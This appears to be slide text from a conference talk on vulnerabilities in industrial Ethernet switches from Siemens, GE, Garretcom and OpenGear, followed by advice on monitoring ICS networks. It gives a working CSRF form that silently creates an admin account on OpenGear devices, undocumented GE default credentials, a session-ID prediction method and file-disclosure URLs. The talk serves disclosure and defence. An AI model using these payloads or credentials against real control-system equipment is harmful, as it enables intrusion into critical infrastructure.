Switches Get Stitches: Episode 3
Then there were three of them.

Who are we?

Last episode on switches get stitches... Scalance X-Family < V5.0.0
echo -n "admin:password:C0A800020002F72C" | md5sum
This is the hash on the wire. Mmmm, low sodium cracking.
C0A8006500000960 C0A8006500001A21 C0A80065000049A6 C0A8006500005F31 C0A800650007323F

Last episode on switches get stitches... Scalance X-Family < V5.0.0
echo -n "admin:password:C0A800020002F72C" | md5sum

Siemens Session IDs are drunk.

C0A80065 uptime in hex -> 00000960

C0A80065

00001A21

C0A80065

000049A6

C0A80065

00005F31

C0A80065 <- client ip in hex 0007323F

Siemens Scalance XNNN CSRF of: firmware || logs || config
https://github.com/blackswanburst/scalance

GE XSS

GE Private Keys. Oh My.

GE Firmware integrity

GE DDoS

Garretcom Keys. Oh My.

OpenGear are cool.
· I reported an oldae to them: CVE-2006-5229 · They fixed it in ONE WEEK. One. · Thank OpenGear for fixing vulns in NORMAL
security patch time instead of MONTHS. This is a personal record, getting anything patched in ONE week in SCADA is unheard of. · Also most secure default deployment I've seen, but Colin has some vulns later.

EOL and forever days.
· Security economics · Code Escrow · Long term thinking · Over to Colin for more switches. · Bring me my stage manhattan, I'm done.

Siemens Scalance X200
Continuing a theme
· Binwalk-ing the 5.0.1 firmware we get:

Siemens Scalance X200
Continuing a theme

Siemens Scalance X200
Continuing a theme

Siemens Scalance X200
Continuing a theme

Siemens Scalance X200
Continuing a theme
· Self signed default Certificate · Can be changed via Web interface
· Not mentioned anywhere in the documentation

GE MDS Wiyz

GE MDS Wiyz

GE MDS Wiyz

GE MDS Wiyz
· Passwd file contained undocumented users and hashes
· admin ­ admin · guest ­ guest · authcode ­ authcode · fact ­ wal63sfo · root - ??

GE MDS Wiyz

Key Management in network equipment
· Default Keys are to be expected, however
­ Undocumented Certs/Keys = bad ­ Unchangeable Cert/keys = bad ­ Self-signed keys = ??
· Switches lack processor power and/or entropy to create their own keys on initialisation.

Key Management in network equipment
· Not just default (undocumented) passwords and accounts any more · Now default (possibly undocumented) certifications and key need
changing.
­ If possible
· In a secure manner
­ Before deployment ­ Direct physical connection to device needed
· Need to think about the risks of self signing certs
"The problem with Key Management is that you have to manage your keys"

Key Management in network equipment
"The problem with Key Management is that you have to manage your keys"

OpenGear

OpenGear Support Report

OpenGear Support Report
· Link on a page normally only available to the root user... · Can be directly accessed by any authenticated user from: · https://192.168.0.1/cgi-bin/supportreport.cgi · Dumps
­ Crontab.root ­ Inittab ­ Syslog ­ Support.txt · Support txt includes: ­ Ifconfig, netstat, ssh key fingerprints and file locations. ­ Iptables, switch statistics, cell modem configuration, ­ Proc/meminfo, disk usage, process ­ Config.xml ­ including all usernames.

OpenGear File get
· https://192.168.0.1/cgi-bin/getfile.cgi · Allows the user to get any file they have
permissions to read. · Useful if you have no SSH/telnet access...

OpenGear File get

OpenGear File get

OpenGear Weak Session IDs
GET /cgi-bin/index.cgi?form=portbuffers&h=0 HTTP/1.1 Host: 192.168.0.1 Connection: keep-alive Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q= 0.8 User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 DNT: 1 Referer: https://192.168.0.1/cgi-bin/index.cgi?form=manage&h=0 Accept-Encoding: gzip, deflate, sdch Accept-Language: en-GB,en-US;q=0.8,en;q=0.6 Cookie: OgSessionId=5fe92c34;

OpenGear Weak Session IDs
Example OgSessionId=4ed8e8bd64fcf18137b957cb66387cd2

OpenGear XSS
· Input filtering is in place to protect against XSS

OpenGear XSS
· But what about outbound?

OpenGear XSS
· But what about outbound?

OpenGear XSS

OpenGear CSRF
· So creating an account looks like:

OpenGear CSRF
· So lets see if we can CSRF it
<iframe style="display:none" name="csrf-frame"></iframe> <form method='POST' action='https://192.168.0.1/?form=users&action=del&index=4&type= user&h=0' target="csrf-frame" id="csrf-form">
<input type='hidden' name='new.name' value='CSRFAdmin1'> <input type='hidden' name='new.description' value='CSRFAdmin'> <input type='hidden' name='new.password' value='password'> <input type='hidden' name='group2' value='admin'> <input type='hidden' name='new.confirm' value='password'> <input type='hidden' name='new.numkeys' value='0'> <input type='hidden' name='new.callback.phone' value=''> <input type='hidden' name='apply' value='Apply'> <input type='hidden' name='form' value='users'> <input type='hidden' name='type' value='user'> <input type='hidden' name='form' value='users'> <input type='submit' value='submit'> </form> <script>document.getElementById("csrf-form").submit()</script>

OpenGear CSRF

Robert

Ideal Layout of a Generic ICS Network

Typical Layout

Challenges in ICS environments
· Legacy equipment · Who owns the problem? · Unmanaged infrastructure · Who has time? · Vendor support · Regulations

NSM in an ICS

· NSM and Asset Identification is all about:
­ Knowing your network topologies ­ Monitoring for changes ­ Building off the basics

· It does have challenges:
­ Isn't a fix all solution ­ Requires people and processes ­ Toughest part is buy-in and prep

· It does bring value:
­ Identify threats ­ Identify misconfigured/failing devices ­ Better situational awareness ­ Fits into larger defense strategy

Pre-HAVEX

· Why it excels in ICS:
­ Static environments ­ Less users than an Enterprise ­ Less assets than IT networks ­ No patches? At least monitor!

Post-HAVEX

Safely Capturing Data
· Logging enabled and centralized · Network and Memory data are king · Test/lab environment first
­ Taps/hubs that fail open ­ Install on scheduled down times
· Work with vendors to have managed network infrastructure
· Be mindful of network bandwidth usage · At least sample environment manually
­ Mirrored port, hubs, taps, etc.

Easy to Use Starter Kit

· 101 matters

· Xplico for FTP

­ It's not sexy but it works · NetworkMiner/Foremost

­ Adversaries are "efficient" ­ Pull out exe's, project

and you must kill noise

files, etc.

· SecurityOnion

· Wireshark to analyse

· Tcpdump to capture

­ Endpoints

· Flowbat/SiLK to analyse flows

­ I/O Data ­ Unusual function codes

Wireshark I/O Data
Pre-HAVEX
Post-HAVEX

Firmware Modification in I/O Data
Pre-Firmware Modification
During-Firmware Modification

Key Things to Focus on
· Identify the top talkers · Identify biggest bandwidth users · Identify encrypted communications · Identify critical assets and normalized traffic · Identify network anomalies
­ Firmware updates not during scheduled down time ­ HMI 1 talking to HMI 2 ­ Odd data flows, spikes in protocol historical data, new
connections in the ICS, PLCs talking to iran.com

This could be us But you playing

We are the love-children of IT and OT
· IT and OT integration is unavoidable · Work together and have a plan · Lots of defender narratives exist · Include the vendors
­ Force the discussions ­ Write it into the contract ­ Know who owns what ­ Ensure responsibility
· Now back to breaking shit
­ Stage booze? I'll take an Old Fashioned please

I am ashamed

We are ashamed

We want you to be ashamed

Ancient Rome left us roads and concrete. Han Dynasty China gave us paper and printing.
Edwardian Britain gave us steam engines. America gave us the internet.
Will we leave our ancestors insecure networks?

Legacy used to mean something different. It used to mean a gift left to the next generation.
Now legacy system means old and insecure.
Reclaim the word legacy.

Be ashamed to die until you provide secure
industrial infrastructure to the next generation

